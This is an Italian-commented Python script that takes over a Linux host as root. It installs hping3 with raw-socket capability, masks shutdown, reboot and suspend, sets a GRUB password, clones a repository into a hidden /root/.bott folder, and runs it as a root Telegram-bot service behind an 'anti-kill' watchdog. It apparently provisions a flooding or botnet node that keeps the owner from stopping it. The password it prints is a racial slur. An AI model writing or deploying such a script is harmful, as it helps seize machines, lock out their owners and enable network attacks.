#!/usr/bin/env python3
import os
import sys
import subprocess

def run(cmd, fatal=False):
    print(f"[+] {cmd}")
    r = subprocess.run(cmd, shell=True)
    if fatal and r.returncode != 0:
        print("[!] ERRORE FATALE")
        sys.exit(1)

# =============================
# REQUIRE ROOT
# =============================
if os.geteuid() != 0:
    print("Devi eseguire questo script come root")
    sys.exit(1)

# =============================
# 1. INSTALL DIPENDENZE BASE
# =============================
run("apt update", fatal=True)
run(
    "apt install -y hping3 git curl build-essential libssl-dev zlib1g-dev "
    "libncurses5-dev libffi-dev libreadline-dev grub-pc grub-common grub-efi-amd64 grub-efi-amd64-bin",
    fatal=True
)

# =============================
# 2. SETCAP HPING3
# =============================
if os.path.exists("/usr/sbin/hping3"):
    run("setcap cap_net_raw+ep /usr/sbin/hping3")

# =============================
# 3. PATH ROOT
# =============================
with open("/root/.bashrc", "a") as f:
    f.write("\nexport PATH=$PATH:/sbin:/usr/sbin\n")

# =============================
# 4. DISABILITA POWER / REBOOT / SUSPEND
# =============================
targets = [
    "ctrl-alt-del.target",
    "poweroff.target",
    "reboot.target",
    "suspend.target",
    "hibernate.target"
]
for t in targets:
    run(f"systemctl mask {t}")

# =============================
# 5. REINSTALL GRUB
# =============================
print("[+] Reinstallazione GRUB completo")

# BIOS
if not os.path.exists("/sys/firmware/efi"):
    run("grub-install /dev/sda", fatal=True)

# EFI
if os.path.exists("/sys/firmware/efi"):
    run("grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=GRUB", fatal=True)

# =============================
# 6. FORZA MODULI GRUB
# =============================
GRUB_DEFAULT = "/etc/default/grub"
with open(GRUB_DEFAULT, "a") as f:
    f.write('\nGRUB_PRELOAD_MODULES="pbkdf2 sha512"\n')

# =============================
# 7. GRUB CUSTOM + INS MOD
# =============================
GRUB_HASH = (
    "grub.pbkdf2.sha512.10000."
    "f3e0328e77725a22d34fbc342deac901."
    "fe145495995aa9d456712838dc4f55a415b379610fd9fe3de6cab84760b14aab"
)

GRUB_CUSTOM = "/etc/grub.d/40_custom"

print("[+] Scrittura configurazione GRUB")

with open(GRUB_CUSTOM, "w") as f:
    f.write(f"""
insmod pbkdf2
insmod sha512

set superusers="root"
password_pbkdf2 root {GRUB_HASH}
""")

# =============================
# 8. UPDATE GRUB
# =============================
run("update-grub", fatal=True)

# =============================
# 9. VERIFICA MODULI
# =============================
print("[+] Verifica moduli pbkdf2")
paths = [
    "/boot/grub/x86_64-efi/pbkdf2.mod",
    "/boot/grub/i386-pc/pbkdf2.mod"
]
if not any(os.path.exists(p) for p in paths):
    print("[!] pbkdf2.mod NON trovato: GRUB non supporta password")
    sys.exit(1)

# =============================
# 10. INSTALL PYTHON 3.10
# =============================
run(
    "cd /usr/src && curl -O https://www.python.org/ftp/python/3.10.14/Python-3.10.14.tgz",
    fatal=True
)
run("cd /usr/src && tar xzf Python-3.10.14.tgz", fatal=True)
run("cd /usr/src/Python-3.10.14 && ./configure --enable-optimizations", fatal=True)
run("cd /usr/src/Python-3.10.14 && make -j$(nproc)", fatal=True)
run("cd /usr/src/Python-3.10.14 && make altinstall", fatal=True)

# =============================
# 11. BOT + LIBRERIE
# =============================
run("/usr/local/bin/python3.10 -m ensurepip", fatal=True)
run("/usr/local/bin/python3.10 -m pip install --upgrade pip", fatal=True)
run("/usr/local/bin/python3.10 -m pip install python-telegram-bot==13.15", fatal=True)

run("cd /root && git clone https://github.com/troiarcazzoguardi-dev/bott.git")

if os.path.exists("/root/bott"):
    run("mv /root/bott /root/.bott")
    run("chmod 711 /root/.bott")

# =============================
# 12. SERVICE BOT
# =============================
with open("/etc/systemd/system/bott.service", "w") as f:
    f.write("""[Unit]
Description=Telegram Bot
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/.bott
ExecStart=/usr/local/bin/python3.10 /root/.bott/bott.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
""")

run("systemctl daemon-reload")
run("systemctl enable bott")
run("systemctl start bott")

# =============================
# 13. WATCHDOG ANTI-KILL
# =============================
print("[+] Installazione watchdog anti-kill")

with open("/etc/systemd/system/bott-watchdog.service", "w") as f:
    f.write("""[Unit]
Description=Bot Watchdog
After=bott.service

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do systemctl is-active --quiet bott || systemctl restart bott; sleep 10; done'
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
""")

run("systemctl daemon-reload")
run("systemctl enable bott-watchdog")
run("systemctl start bott-watchdog")

print("\n[✓] SCRIPT COMPLETATO")
print("    - GRUB protetto (password: SUCANEGRO)")
print("    - Bot attivo")
print("    - Watchdog anti-kill attivo")
